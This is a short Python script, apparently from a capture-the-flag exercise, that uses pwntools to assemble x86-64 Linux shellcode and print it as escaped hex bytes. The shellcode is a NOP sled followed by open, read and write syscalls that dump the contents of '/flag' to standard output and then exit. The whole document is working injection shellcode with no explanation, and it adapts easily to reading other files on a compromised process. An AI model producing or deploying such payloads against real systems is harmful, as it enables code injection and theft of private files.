from pwn import *

context.arch = 'amd64'
context.os = 'linux'

assembly = """
    .rept 2048
    nop
    .endr
    mov rax, 0x00000067616c662f
    push rax

    mov rdi, rsp
    mov rsi, 0
    mov rax, 2
    syscall

    mov rdi, rax
    mov rsi, rsp
    mov rdx, 1000
    mov rax, 0
    syscall

    mov rdi, 1
    mov rsi, rsp
    mov rdx, rax
    mov rax, 1
    syscall

    mov rdi, 42
    mov rax, 60
    syscall
"""

shellcode = asm(assembly)

formattedShellCode = ''.join([f'\\x{byte:02x}' for byte in shellcode])

print(formattedShellCode)
